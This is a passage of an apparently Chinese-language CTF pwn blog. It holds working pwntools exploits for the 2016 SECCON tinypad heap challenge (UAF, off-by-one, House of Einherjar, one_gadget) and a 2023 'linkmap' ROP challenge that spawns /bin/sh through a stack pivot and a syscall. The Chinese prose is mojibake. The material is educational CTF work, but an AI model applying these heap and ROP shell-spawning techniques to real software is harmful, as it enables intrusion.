‡åœ°å€</span></span><br><span class="line">  d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert(e == stack_var);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯å’Œtcache poisoningé…åˆæ¥ä½¿ç”¨äº† åˆ©ç”¨å †å—bæ¥è¦†å†™cçš„prevsizeå’Œprevinuseä¸ºåˆ°fakechunkçš„aå—ï¼Œfreecåè§¦å‘åˆå¹¶å¹¶ç»•è¿‡unlink bå †å—è¿˜åœ¨ä½¿ç”¨ä½†æ˜¯è¢«åŒ…è£¹æ”¾å…¥unsortedbiné‡Œ</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730223649416.png" alt="image-20230730223649416"></p><p>intptr_t* d &#x3D; malloc(0x158);ä¼šæŠŠbç”³è¯·åˆ°dé‡Œï¼Œåé¢freeæ‰bé“¾å…¥tcache</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224051202.png" alt="image-20230730224051202"></p><p>åé¢å†åˆ©ç”¨dæ¥è¦†å†™bçš„ä¸‹ä¸€ä¸ªç©ºé—²å †å—ä¸ºç›®æ ‡åœ°å€</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224245777.png" alt="image-20230730224245777">ã€</p><p>å°±å¯ä»¥ç”³è¯·å‡ºæ¥äº†</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>libc 2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/m/h/s/c/p/h/<span class="number">2016</span>_seccon_tinypad&gt; checksec tinypad </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/2016_seccon_tinypad/tinypad&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>è‡ªå®šçš„read_untilæœ‰off by oneçš„æ¼æ´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_until</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">int</span> <span class="built_in">terminate</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n = read_n(<span class="number">0LL</span>, &amp;a1[i], <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !n || a1[i] == <span class="built_in">terminate</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    dummyinput(<span class="built_in">terminate</span>);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteæ—¶å­˜åœ¨åªæ˜¯ç½®é›¶äº†å¤§å°ï¼Œå­˜åœ¨uaf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="type">void</span> **)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">248</span>]);</span><br><span class="line">*(_QWORD *)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">240</span>] = <span class="number">0LL</span>;</span><br><span class="line">writeln(<span class="string">&quot;\nDeleted.&quot;</span>, <span class="number">9uLL</span>);</span><br></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯uafæ³„éœ²libcå’Œheapbaseï¼Œç„¶ååˆ©ç”¨off by oneæ¥é€ æˆå †å—é‡å  å°±æ˜¯2.31how2heapçš„ä¾‹å­ï¼Œåˆ©ç”¨editåŠŸèƒ½æŠŠç®¡ç†åŒºtinypad+256é“¾å…¥fastbiné“¾è¡¨ï¼Œç”³è¯·åˆ°tinypad+256çš„ç®¡ç†åŒºï¼Œç”±äºeditåŠŸèƒ½æ—¶ç”¨æ¥å½“å‰åŒºåŸŸæ‰€å­˜æ•°æ®å¤§å°æ¥ä½œä¸ºé‡æ–°è¯»å…¥çš„å¤§å°æ‰€ä»¥ä¸èƒ½æ‰“free mallocçš„hookï¼Œåªèƒ½åˆ©ç”¨environå…¨å±€å˜é‡ï¼Œæ¥æ³„éœ²æ ˆåœ°å€æ¥è¦†ç›–mainçš„è¿”å›åœ°å€ä¸ºogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Is it OK?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x040098C&#x27;)#menu show</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x00400E17&#x27;)#edit</span></span><br><span class="line"><span class="comment">#leak heapbase</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 3\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">4</span>))-<span class="number">0x30</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line">system=libcelf.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">free_hook=libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">chun1=heapbase</span><br><span class="line">chun2=heapbase+<span class="number">0x30</span></span><br><span class="line">chun3=heapbase+<span class="number">0x60</span></span><br><span class="line">add(<span class="number">0x28</span>,flat(<span class="number">0</span>,<span class="number">0x20</span>,chun1+<span class="number">0x10</span>,chun1+<span class="number">0x10</span>,<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(chun3-chun1-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">256</span>+<span class="number">0x0602040</span>-<span class="number">8</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x31</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#ç»•è¿‡fastbinçš„å¤§å°æ£€æŸ¥</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line">enviorn=libcbase+libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,flat(enviorn,<span class="number">0x31</span>,<span class="number">256</span>+<span class="number">0x0602040</span>+<span class="number">8</span>))</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffebf17a478</span>-<span class="number">0x7ffebf17a388</span>)</span><br><span class="line">p(<span class="string">&#x27;ret&#x27;</span>,main_ret)</span><br><span class="line">ogg=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>,p64(ogg))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å†™å®Œä¹‹åå»çœ‹äº†ä¸€çœ¼wpï¼Œå‘ç°edité‡Œä¼šå…ˆæŠŠè¾“å…¥è¯»åˆ°tinypadï¼Œå¯ä»¥ç›´æ¥ç”¨tinypadçš„åŒºåŸŸæ¥æ„é€ fakechunkï¼Œåˆ©ç”¨house of ejinherjaræ¥ç”³è¯·åˆ°tinypadï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯è¦åœ¨tinypadè‡³å°‘+0x20çš„ä½ç½®å»ä¼ªé€ fakechunkï¼Œå› ä¸ºåé¢ç”³è¯·çš„å †æœ€å¤§æ‰0x100ï¼Œå¤ªèœäº†åˆšå¼€å§‹æ²¡çœ‹å‡ºæ¥å‘œå‘œ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 å·…å³°æå®¢ pwn</title>
      <link href="/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"/>
      <url>/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>mainå‡½æ•°æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰å¯ä»¥æ³„éœ²çš„å¸¸è§„æ–¹æ³•</p><p>ä½¿ç”¨ropperå¯ä»¥å‘ç°ä¸€æ®µgadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040076</span>D B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000400772</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000400773</span> C3                            retn</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°è¿”å›æ—¶mov eaxï¼Œ0æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™æ®µgadgetæŠŠrbp - 8å¤„çš„æ•°æ®è¯»åˆ°0x601020 .bsså¤„</p><ul><li><p>æŠŠreadçš„gotè¯»åˆ°0x601020é™„è¿‘</p></li><li><p>æŠŠè¯»åˆ°bssæ®µçš„readæœ€åä¸€ä½æ”¹ä¸º0x90 å³syscallåœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble read</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __GI___libc_read:</span><br><span class="line">   <span class="number">0x00007fb1a3514980</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line">   <span class="number">0x00007fb1a3514984</span> &lt;+<span class="number">4</span>&gt;:     mov    eax,DWORD PTR fs:<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x00007fb1a351498c</span> &lt;+<span class="number">12</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00007fb1a351498e</span> &lt;+<span class="number">14</span>&gt;:    jne    <span class="number">0x7fb1a35149a0</span> &lt;__GI___libc_read+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x00007fb1a3514990</span> &lt;+<span class="number">16</span>&gt;:    syscall</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨gadgetæ§åˆ¶å‚æ•°æ‰§è¡Œè°ƒç”¨å·ä¸º0x3Bçš„sys_execveç³»ç»Ÿè°ƒç”¨</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ezzzz&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400772&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400768&#x27;)</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x0400570</span></span><br><span class="line">pop_rdi=<span class="number">0x04007e3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x04007e1</span></span><br><span class="line">leave_ret=<span class="number">0x0400712</span></span><br><span class="line">bss_data=<span class="number">0x601020</span></span><br><span class="line">gadget=<span class="number">0x000000000040066b</span> <span class="comment">#0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">binsh=bss_data+<span class="number">100</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload=flat(padding,pop_rbp_ret,read_got+<span class="number">8</span>,gadget,<span class="number">0</span>)<span class="comment">#readå‡½æ•°åœ°å€å†™å…¥bssæ®µ</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,bss_data,<span class="number">0</span>,read_plt)<span class="comment">#æœ€åä¸€ä½æ”¹ä¸º0x90</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,binsh,<span class="number">0</span>,read_plt)<span class="comment">#è¯»å…¥binshåŒæ—¶è®¾ç½®ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">payload+=flat(pop_rdi,binsh,pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.migrate(bss_data)<span class="comment">#æ ˆè¿ç§»åˆ°bss_dataï¼Œrop</span></span><br><span class="line">payload+=rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#æ”¹ä¸º0x90</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">8</span>))<span class="comment">#è®¾ç½®eaxä¸ºexecveè°ƒç”¨å·0x3b</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åæ—¶<code> syscall  &lt;SYS_execve&gt;</code>rsiå‚æ•°éœ€è¦ä¸º0ï¼Œrdxä¸å¿…éœ€</p><p>é™¤äº†æ ˆè¿ç§»è¿˜å¯ç”¨csué‡Œçš„gadgetæ¥æ‰§è¡Œåˆ°syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:00000000004007C3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004007C6 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007C9</span><br><span class="line">.text:00000000004007CD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:00000000004007D1 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4 75 EA                         jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D4</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34â†‘j</span><br><span class="line">.text:00000000004007D6 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:00000000004007DA 5B                            pop     rbx</span><br><span class="line">.text:00000000004007DB 5D                            pop     rbp</span><br><span class="line">.text:00000000004007DC 41 5C                         pop     r12</span><br><span class="line">.text:00000000004007DE 41 5D                         pop     r13</span><br><span class="line">.text:00000000004007E0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004007E2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004007E4 C3                            retn</span><br></pre></td></tr></table></figure><h3 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h3><p>åªæœ‰addåŠŸèƒ½å¯ä»¥ç”¨ï¼Œå…¶ä»–åŠŸèƒ½éœ€è¦canaryä¸º0æ‰å¯ä»¥ï¼ŒåŸºæœ¬ä¸å¯èƒ½</p><p>ä¸‹é¢çš„å‡½æ•°å­˜åœ¨æ•´æ•°æº¢å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;How many dark notes do you want?&quot;</span>);</span><br><span class="line">note_count = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))read_num)(<span class="string">&quot;How many dark notes do you want?&quot;</span>, a2);</span><br><span class="line">note_ptr_ar = <span class="built_in">malloc</span>(<span class="number">8</span> * note_count);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">index_add = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, _BYTE *))read_num)(<span class="string">&quot;Index: &quot;</span>, v3);</span><br><span class="line"><span class="keyword">if</span> ( index_add &gt;= <span class="number">0</span> &amp;&amp; index_add &lt; note_count )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = (<span class="type">void</span> **)((<span class="type">char</span> *)note_ptr_ar + <span class="number">8</span> * index_add);</span><br><span class="line">    *v6 = <span class="built_in">malloc</span>(<span 